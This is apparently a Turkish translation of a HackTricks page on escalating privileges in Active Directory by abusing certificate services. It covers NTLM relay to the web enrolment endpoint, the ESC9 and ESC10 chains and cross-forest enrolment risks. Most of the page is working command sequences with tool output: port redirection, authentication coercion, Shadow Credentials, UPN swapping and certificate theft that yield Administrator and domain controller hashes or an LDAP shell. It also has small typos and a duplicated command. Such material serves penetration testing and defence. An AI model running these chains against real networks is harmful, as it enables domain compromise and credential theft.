Bu saldırı yöntemi, bir hedefin Active Directory ortamında sertifikaları kötüye kullanarak ayrıcalıkları yükseltmeyi hedefler. Sertifikalar, kimlik doğrulama ve yetkilendirme için kullanılan önemli bileşenlerdir. Sertifikalar, bir kullanıcının veya bir bilgisayarın kimliğini doğrulamak ve güvenli bir şekilde iletişim kurmak için kullanılır.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile Kötüye Kullanım

Sertifika talebi, Certipy tarafından varsayılan olarak `Machine` veya `User` şablonuna dayanarak yapılır ve iletilen hesap adının `$` ile bitip bitmediğine bağlı olarak belirlenir. Alternatif bir şablonun belirtilmesi, `-template` parametresinin kullanımıyla gerçekleştirilebilir.

[PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik, kimlik doğrulamayı zorlamak için kullanılabilir. Alan denetleyicileriyle uğraşırken, `-template DomainController` belirtilmesi gerekmektedir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Güvenlik Uzantısı Yok - ESC9 <a href="#5485" id="5485"></a>

### Açıklama

**`msPKI-Enrollment-Flag`** için yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`), ESC9 olarak adlandırılır ve bir sertifikada **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının** gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` olarak ayarlandığında (varsayılan ayar), `2` ayarına karşılaştırıldığında önem kazanır. Bu önemi, daha zayıf bir Kerberos veya Schannel için sertifika eşlemesi söz konusu olduğunda (ESC10 gibi), ESC9'un olmaması gereksinimleri değiştirmeyeceği için artar.

Bu bayrağın ayarının önem kazandığı koşullar şunları içerir:
- `StrongCertificateBindingEnforcement` `2` olarak ayarlanmamışsa (varsayılan `1` ayarı) veya `CertificateMappingMethods` `UPN` bayrağını içeriyorsa.
- Sertifika, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile işaretlenmiştir.
- Sertifikada herhangi bir istemci kimlik doğrulama EKU belirtilmiştir.
- Herhangi bir hesap üzerinde `GenericWrite` izinleri başka bir hesabı tehlikeye atmak için kullanılabilir.

### Kötüye Kullanım Senaryosu

`John@corp.local`, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olup `Administrator@corp.local`'ı tehlikeye atmayı hedefliyorsa, `Jane@corp.local`'ın kaydolmasına izin verilen `ESC9` sertifika şablonu, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağıyla yapılandırılmıştır.

Başlangıçta, `Jane`'in hash'i, `John`'un `GenericWrite` izinleri sayesinde Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Sonuç olarak, `Jane`'nin `userPrincipalName` değeri `@corp.local` alan kısmı bilerek atlanarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local` olarak belirtilen `Administrator`'un `userPrincipalName` olarak ayrı kalması koşuluyla kısıtlamaları ihlal etmez.

Bunun ardından, zafiyetli olarak işaretlenen `ESC9` sertifika şablonu, `Jane` olarak talep edilir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Belirtilmelidir ki, sertifikanın `userPrincipalName` alanı "Administrator" olarak yansıtılır ve herhangi bir "object SID" içermez.

`Jane`'in `userPrincipalName` alanı daha sonra orijinal değeri olan `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifika ile kimlik doğrulama denemesi şu anda `Administrator@corp.local` kullanıcısının NT hash'ini verir. Sertifikanın etki alanı belirtimi olmadığından komut `-domain <domain>` içermelidir:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

ESC10 tarafından belirtilen iki kayıt defteri anahtar değeri, alan denetleyicisi tarafından kullanılır:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altında `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`) ve önceden `0x1F` olarak ayarlanmıştır.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altında `StrongCertificateBindingEnforcement` için varsayılan ayar `1` ve önceden `0` olarak ayarlanmıştır.

**Durum 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods` `UPN` bitini (`0x4`) içeriyorsa.

### Saldırı Durumu 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir hesap A, herhangi bir hesap B'yi ele geçirmek için kullanılabilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip bir saldırgan, `Administrator@corp.local` hesabını ele geçirmeyi hedefler. İşlem, herhangi bir sertifika şablonunun kullanılmasına izin veren ESC9 ile aynıdır.

Başlangıçta, `Jane`'in hash değeri, `GenericWrite` kullanarak Shadow Credentials kullanılarak elde edilir.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Sonrasında, `Jane`'in `userPrincipalName` değeri `@corp.local` kısmını atlayarak kasıtlı olarak `Administrator` olarak değiştirilir. Bu, bir kısıtlama ihlalini önlemek amacıyla yapılır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunu takiben, varsayılan `Kullanıcı` şablonunu kullanarak `Jane` olarak istemci kimlik doğrulamasını etkinleştiren bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri daha sonra orijinal değeri olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifika ile kimlik doğrulama yapmak, sertifikada etki alanı ayrıntılarının olmaması nedeniyle komutta etki alanının belirtilmesini gerektirir. Bu işlem sonucunda `Administrator@corp.local` kullanıcısının NT hash değeri elde edilir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Durumu 2

`CertificateMappingMethods` içinde `UPN` bit bayrağı (`0x4`) bulunan bir hesap A, `userPrincipalName` özelliğine sahip olmayan herhangi bir hesap B'yi (makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` dahil) tehlikeye atabilir.

Burada, `GenericWrite` izinlerini kullanarak `Jane`'in hash'ini Shadow Kimlik Bilgileri aracılığıyla elde ederek `DC$@corp.local` hesabını tehlikeye atma hedeflenmektedir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
`Jane` kullanıcısı için varsayılan `User` şablonu kullanılarak istemci kimlik doğrulama sertifikası istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName`i bu işlem sonrasında orijinal haline döner.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schanel üzerinden kimlik doğrulama yapmak için Certipy'nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulama başarısı `u:CORP\DC$` olarak belirtilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP kabuğu aracılığıyla, `set_rbcd` gibi komutlar Kaynak Tabanlı Kısıtlı Delege (RBCD) saldırılarını etkinleştirir ve potansiyel olarak etki alanı denetleyicisini tehlikeye atar.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu zayıflık, `userPrincipalName` olmayan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabına da uygulanır. Varsayılan olarak `Administrator@corp.local` hedeflenen bir hesaptır çünkü yükseltilmiş LDAP yetkilerine sahiptir ve varsayılan olarak bir `userPrincipalName` yoktur.


## Sertifikalarla Ormanların Tehdit Edilmesi Pasif Sesle Açıklanır

**Ormanlar arası kayıt** için yapılandırma oldukça basittir. Kaynak ormandan **kök CA sertifikası** yöneticiler tarafından hesap ormanlarına **yayınlanır** ve kaynak ormandaki **kurumsal CA** sertifikaları her hesap ormanındaki `NTAuthCertificates` ve AIA konteynerlerine **eklenir**. Bu düzenleme, kaynak ormandaki CA'nın PKI'yi yönettiği diğer tüm ormanlar üzerinde **tam kontrol** sağlar. Bu CA, saldırganlar tarafından **ele geçirilirse**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikaları **saldırganlar tarafından sahte olarak oluşturulabilir**, böylece ormanın güvenlik sınırı ihlal edilir.

### Yabancı İlkelerin Kazandığı Kayıt Yetkileri

Çoklu orman ortamlarında, **kimlik doğrulaması yapılan kullanıcıların veya yabancı ilkelerin** (Enterprise CA'ya ait olmayan ormana dışarıdan kullanıcılar/gruplar) **kayıt ve düzenleme yetkisi** veren **sertifika şablonları yayınlayan** Kurumsal CA'lar konusunda dikkatli olunmalıdır.\
Bir güven ilişkisi üzerinden kimlik doğrulaması yapıldığında, AD tarafından kullanıcının belirteciye **Kimlik Doğrulama Yapılmış Kullanıcılar SID** eklenir. Bu nedenle, bir etki alanı, **Kimlik Doğrulama Yapılmış Kullanıcılar kayıt yetkisi veren bir Kurumsal CA'ya sahipse**, bir kullanıcının farklı bir ormandan bir şablona **kaydolması mümkün olabilir**. Benzer şekilde, bir şablona **kayıt yetkisi açıkça bir yabancı ilke tarafından verilirse**, böylece başka bir ormandan bir ilke, **başka bir ormandaki bir şablona kaydolabilir**, böylece ormanlar arası bir erişim kontrol ilişkisi oluşturulur.

Her iki senaryo da bir ormandan diğerine olan saldırı yüzeyini artırır. Sertifika şablonunun ayarları, bir saldırganın yabancı bir etki alanında ek ayrıcalıklar elde etmek için sömürülebilir.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u** takip edin.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.

</details>
